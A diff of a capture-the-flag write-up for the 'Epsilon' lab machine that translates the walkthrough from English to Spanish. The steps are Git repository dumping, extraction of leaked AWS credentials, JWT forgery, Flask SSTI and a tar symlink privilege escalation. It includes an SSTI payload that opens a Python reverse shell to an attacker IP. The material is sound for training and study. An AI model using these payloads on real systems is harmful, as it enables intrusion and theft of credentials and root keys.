@@ -1,55 +1,60 @@
 <h2>Overview</h2>
-<p>Epsilon is a medium-difficulty Linux machine that exposes a Git repository on the web server. During enumeration, AWS Lambda credentials leaked in Git commits are discovered, allowing us to obtain the secret key used to sign JWTs in the Flask application. With this key, we can forge administrator cookies and access protected routes. Finally, root is obtained by abusing a cronjob that runs <code>tar</code> with the <code>-h</code> option, allowing critical files to be replaced via symbolic links.</p>
+<p>Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Durante la enumeración se descubren credenciales de AWS Lambda filtradas en commits anteriores. Con estas credenciales, obtenemos la clave secreta utilizada para firmar JWTs en la aplicación Flask, lo que permite generar cookies de administrador y acceder a rutas protegidas. Finalmente, se obtiene acceso root explotando un cronjob que ejecuta <code>tar -h</code>, permitiendo reemplazar archivos críticos mediante enlaces simbólicos.</p>
 
 <h2>Key steps</h2>
 <ol>
-  <li>Port scanning and enumeration using <code>nmap</code>.</li>
-  <li>Web application enumeration and dumping the Git repository.</li>
-  <li>Reviewing commits to extract AWS Lambda credentials.</li>
-  <li>Generating a JWT token with the secret key for administrative access.</li>
-  <li>Exploiting SSTI in the Flask application to obtain a shell.</li>
-  <li>Privilege escalation using a cronjob with <code>tar</code> and symbolic links.</li>
+  <li>Escaneo de puertos completo con <code>nmap</code>.</li>
+  <li>Escaneo detallado de los puertos abiertos para identificación de versiones y servicios.</li>
+  <li>Enumeración de la aplicación web y descarga del repositorio Git.</li>
+  <li>Revisión de commits antiguos para extraer credenciales de AWS Lambda.</li>
+  <li>Generación de un token JWT de administrador para acceso a rutas protegidas.</li>
+  <li>Explotación SSTI en Flask para obtener shell inicial.</li>
+  <li>Escalada de privilegios usando cronjob con <code>tar -h</code> y enlaces simbólicos.</li>
 </ol>
 
 <h3>1. Port enumeration</h3>
-<p>The first step is identifying which services are exposed on the target machine. We use <code>nmap</code> for a full TCP port scan:</p>
+<p>Primero identificamos los servicios expuestos en la máquina objetivo. Se realiza un escaneo SYN de todos los puertos TCP:</p>
 
-<pre><code>nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.134</code></pre>
+<pre><code>sudo nmap -p- -sS --open --min-rate 5000 -n -vvv 10.10.11.134 -oN allPorts</code></pre>
 
-<p><strong>Flag explanation:</strong></p>
-<ul>
-  <li><code>-p-</code>: Scans all 65535 ports.</li>
-  <li><code>--open</code>: Shows only open ports.</li>
-  <li><code>-sT</code>: Full TCP connect scan.</li>
-  <li><code>--min-rate 5000</code>: Sends at least 5000 packets per second.</li>
-  <li><code>-vvv</code>: Maximum verbosity.</li>
-  <li><code>-n</code>: Skips DNS resolution.</li>
-  <li><code>-Pn</code>: Skips initial ping (useful against firewalls blocking ICMP).</li>
-</ul>
+<p><strong>Resultados:</strong></p>
 
-<p><strong>Results:</strong></p>
-<pre><code>22/tcp   open  ssh
-80/tcp   open  http
-5000/tcp open  http</code></pre>
+<pre><code>PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+5000/tcp open   upnp</code></pre>
 
-<p>Interpretation: SSH server for remote access, public website on port 80, and another HTTP application on port 5000 (API or internal app).</p>
+<p>Interpretación: hay un servidor SSH para acceso remoto, un sitio web público en el puerto 80 y otra aplicación HTTP en el puerto 5000.</p>
+
+<p>Luego, realizamos un escaneo más detallado de los puertos abiertos para identificar versiones y servicios:</p>
+
+<pre><code>sudo nmap -p22,80,5000 -sCV -n -vvv 10.10.11.134 -oN infoPorts</code></pre>
+
+<p><strong>Resultados con detección de versiones:</strong></p>
+
+<pre><code>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-title: 403 Forbidden
+|_http-git: Git repository found at /.git/
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Costume Shop</code></pre>
 
 <h3>2. HTTP enumeration and Git repository dump</h3>
-<p>Visiting <code>http://10.10.10.134</code> returns a 403. We check if a Git repository is exposed at <code>/.git</code> using <code>gitdumper</code>:</p>
+<p>Visitando <code>http://10.10.11.134</code> obtenemos un 403. Se comprueba si el repositorio Git está expuesto en <code>/.git</code> usando <code>gitdumper</code>:</p>
 
-<pre><code>./gitdumper.sh http://10.10.10.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
+<pre><code>./gitdumper.sh http://10.10.11.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
 
-<p>This allows us to obtain commit history, files, and leaked credentials.</p>
+<p>Esto permite obtener la historia de commits, archivos y credenciales filtradas.</p>
 
-<h4>Reviewing commits to find credentials</h4>
-<p>Inspecting current files did not reveal credentials. We check previous commits:</p>
+<h4>Revisión de commits antiguos</h4>
+<p>Los archivos actuales no revelan credenciales, por lo que revisamos commits anteriores:</p>
 
 <pre><code>cd ~/CTF/Epsilon/loot/epsilon-repo
 git log --oneline --graph --all
 git log -p > ../commits_diff.txt
 cat ../commits_diff.txt</code></pre>
 
-<p>In a previous commit, we found AWS Lambda credentials:</p>
+<p>Se encuentran credenciales de AWS Lambda en un commit antiguo:</p>
 
 <pre><code>@@ -8,8 +8,8 @@ session = Session(
 -     aws_access_key_id='<aws_access_key_id>',
@@ -60,62 +65,55 @@ cat ../commits_diff.txt</code></pre>
       endpoint_url='http://cloud.epsilon.htb'
 )</code></pre>
 
-<p>✅ Important: Credentials are only found by going back in the commit history.</p>
-
 <h3>3. AWS Lambda enumeration</h3>
-<p>We configure AWS CLI with the credentials:</p>
+<p>Configuramos AWS CLI con las credenciales obtenidas:</p>
 
 <pre><code>aws configure
-# aws_access_key_id and aws_secret_access_key
-# region: us-east-1</code></pre>
+# aws_access_key_id y aws_secret_access_key
+# región: us-east-1</code></pre>
 
-<p>List the Lambda functions:</p>
+<p>Listamos funciones Lambda:</p>
 
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions</code></pre>
 
-<p>Download the function code:</p>
+<p>Descargamos el código de la función:</p>
 
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
 wget http://cloud.epsilon.htb/path/to/code.zip
 unzip code.zip
 cat lambda_function.py</code></pre>
 
-<p>The <strong>secret key</strong> used to sign JWTs is found in this file.</p>
+<p>Se encuentra la <strong>clave secreta</strong> usada para firmar JWTs.</p>
 
-<h3>4. Exploitation and initial access</h3>
-<p>Generate an admin JWT using PyJWT:</p>
+<h3>4. Explotación y acceso inicial</h3>
+<p>Generamos un JWT de administrador usando PyJWT:</p>
 
 <pre><code>import jwt
 secret = 'VALUE_EXTRACTED_FROM_LAMBDA'
 token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
 print(token)</code></pre>
 
-<p>Place this token in the <code>auth</code> cookie to access admin routes:</p>
+<p>Se coloca este token en la cookie <code>auth</code> para acceder a rutas administrativas:</p>
 
-<pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home</code></pre>
+<pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home</code></pre>
 
-<p>The same cookie can be used to access <code>http://epsilon.htb:5000/home</code>:</p>
-<img src="writeups/img/epsilon/img3.png" alt="Home inside the platform">
-<p>The bypass can be observed</p>
-<img src="writeups/img/epsilon/img4.png" alt="Authenticated home view">
+<p>La misma cookie funciona para <code>http://epsilon.htb:5000/home</code>.</p>
 
-<h4>SSTI exploitation</h4>
-<p>On <code>/order</code>, fields are evaluated with <code>render_template_string</code>, allowing <strong>SSTI</strong>. For reconnaissance, we try:</p>
+<h4>SSTI en Flask</h4>
+<p>En <code>/order</code>, los campos son evaluados con <code>render_template_string</code>, permitiendo SSTI. Probamos:</p>
 
 <pre><code>{{ 3*3 }}</code></pre>
 
-<p>We get <strong>9</strong> in the response (Burp), confirming the vulnerability:</p>
-<img src="writeups/img/epsilon/img5.png" alt="SSTI test">
+<p>Se obtiene <strong>9</strong>, confirmando la vulnerabilidad.</p>
 
-<p>To execute a reverse shell:</p>
+<p>Para un reverse shell:</p>
 
 <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
 
-<p>We obtained a reverse shell and the first flag (<code>user.txt</code>):</p>
-<img src="writeups/img/epsilon/img6.png" alt="First flag obtained">
+<p>Se obtiene shell y el primer flag (<code>user.txt</code>).</p>
 
-<h3>5. Privilege escalation</h3>
-<p>Using <code>pspy</code>, we find a backup cronjob that runs <code>tar -h</code> every 5 seconds:</p>
+<h3>5. Escalada de privilegios</h3>
+<p>Usando <code>pspy</code>, encontramos un cronjob que ejecuta <code>tar -h</code> cada 5 segundos:</p>
 
 <pre><code>#!/bin/bash
 file=`date +%N`
@@ -127,7 +125,7 @@ check_file=`date +%N`
 /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
 /usr/bin/rm -rf /opt/backups/*</code></pre>
 
-<p>We abuse <code>-h</code> to replace critical files using symbolic links:</p>
+<p>Abusamos de <code>-h</code> para reemplazar archivos críticos mediante enlaces simbólicos:</p>
 
 <pre><code>#!/bin/bash
 while true; do 
@@ -138,9 +136,10 @@ while true; do
     fi; 
 done</code></pre>
 
-<p>Explanation: This script loops waiting for <code>checksum</code> to exist. Once created by the cronjob, we remove it and create a symbolic link pointing to <code>/root/.ssh/id_rsa</code>. When the cronjob archives again with <code>-h</code>, the private key is copied to a location we can access, simulating the backup “extraction.”</p>
+<p>Cuando el cronjob vuelve a archivar con <code>-h</code>, la clave privada de root se copia a una ubicación accesible.</p>
 
-<p>Example of extracting <code>id_rsa</code>:</p>
+<p>Ejemplo de extracción de <code>id_rsa</code>:</p>
+
 <pre><code>cd /tmp
 ./root.sh
 cd /var/backups/web_backups
@@ -148,11 +147,11 @@ cp 503891800.tar /tmp
 cd /tmp
 tar -xf 503891800.tar
 cd opt/backups
-cat checksum  # Contains the id_rsa</code></pre>
+cat checksum  # Contiene la id_rsa</code></pre>
 
-<p>Finally, connect via SSH as root:</p>
+<p>Finalmente, se conecta vía SSH como root:</p>
 
-<pre><code>ssh -i id_rsa root@10.10.10.134</code></pre>
+<pre><code>ssh -i id_rsa root@10.10.11.134</code></pre>
 
-<p>This grants full access to the Epsilon machine.</p>
+<p>Se obtiene acceso completo a la máquina Epsilon.</p>
 
